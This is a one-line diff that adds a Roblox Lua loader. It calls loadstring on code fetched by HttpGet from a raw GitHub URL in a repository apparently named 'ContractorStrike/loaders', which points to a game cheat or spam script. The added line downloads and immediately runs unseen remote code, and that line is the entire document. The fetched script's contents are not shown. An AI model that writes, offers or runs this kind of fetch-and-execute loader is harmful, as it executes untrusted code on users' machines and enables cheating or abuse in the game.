@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/interrogation-new-cases-spam2-obb8xf1io9qfp6.lua"))()
